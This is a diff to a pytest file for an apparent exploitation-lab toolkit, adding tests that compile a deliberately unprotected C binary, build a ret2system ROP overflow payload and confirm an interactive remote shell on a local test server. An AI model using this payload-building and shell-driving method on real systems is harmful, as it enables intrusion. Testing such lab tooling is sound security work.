@@ -22,7 +22,10 @@ import pytest
 from pwnable_lab.analyzer.strategy import find_ret_gadget, ret2system_plan
 from pwnable_lab.elf.parser import parse_elf
 from pwnable_lab.payload.pack import RopStep, build_overflow
-from pwnable_lab.sandbox.remote import prove_shell_remote
+from pwnable_lab.sandbox.remote import (
+    prove_interactive_shell_remote,
+    prove_shell_remote,
+)
 
 _SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}
 _HAVE_GCC = shutil.which("gcc") is not None
@@ -112,6 +115,77 @@ def test_prove_shell_remote_reports_failure_on_closed_port():
     try:
         proof = prove_shell_remote(
             "127.0.0.1", port, b"A" * 8, marker="PWNPILOT_NOPE", timeout=2.0
+        )
+        assert proof.shell_spawned is False
+    finally:
+        server.shutdown()
+        server.server_close()
+
+
+@pytest.mark.skipif(
+    not (_SUPPORTED and _HAVE_GCC),
+    reason="Linux/x86-64 + gcc 필요(실제 실행/소켓)",
+)
+def test_interactive_remote_shell_runs_multiple_commands(tmp_path):
+    """확정 payload 로 딴 원격 셸에서 여러 명령을 한 연결로 순차 실행·회수한다."""
+    csrc = tmp_path / "r.c"
+    csrc.write_text(_R2S_SRC)
+    binary = tmp_path / "r"
+    subprocess.run(
+        ["gcc", "-fno-stack-protector", "-no-pie", "-o", str(binary), str(csrc)],
+        check=True,
+        capture_output=True,
+    )
+    img = parse_elf(binary.read_bytes())
+    plan = ret2system_plan(img)
+    assert plan is not None
+    ret = find_ret_gadget(img)
+
+    server = _Forking(("127.0.0.1", 0), _make_handler(str(binary)))
+    port = server.server_address[1]
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    try:
+        proven = None
+        for align in (False, True):
+            chain = [RopStep(plan["binsh"])]
+            if align and ret is not None:
+                chain.append(RopStep(ret))
+            chain.append(RopStep(plan["system"]))
+            payload = build_overflow(72, plan["pop_rdi"], bits=64, chain=chain)
+            proof = prove_interactive_shell_remote(
+                "127.0.0.1",
+                port,
+                payload,
+                commands=["echo PWNPILOT_STEP1", "echo PWNPILOT_STEP2"],
+                timeout=5.0,
+            )
+            if proof.shell_spawned:
+                proven = proof
+                break
+        assert proven is not None, "대화형 원격 셸을 증명하지 못했습니다."
+        assert proven.shell_spawned is True
+        assert len(proven.commands) == 2
+        # 각 명령이 셸에서 실행돼(sentinel 회수) 자기 출력을 냈다.
+        assert all(c.matched for c in proven.commands)
+        assert b"PWNPILOT_STEP1" in proven.commands[0].output
+        assert b"PWNPILOT_STEP2" in proven.commands[1].output
+        # sentinel 은 출력에서 제거된다(순수 명령 출력만).
+        assert proven.commands[0].marker.encode() not in proven.commands[0].output
+    finally:
+        server.shutdown()
+        server.server_close()
+
+
+def test_interactive_remote_shell_reports_failure_on_no_shell():
+    """셸이 안 뜨면(payload 미소비) shell_spawned=False, 첫 명령 미회수."""
+    server = _Forking(("127.0.0.1", 0), _make_handler("/bin/true"))
+    port = server.server_address[1]
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    try:
+        proof = prove_interactive_shell_remote(
+            "127.0.0.1", port, b"A" * 8, commands=["id", "pwd"], timeout=2.0
         )
         assert proof.shell_spawned is False
     finally:
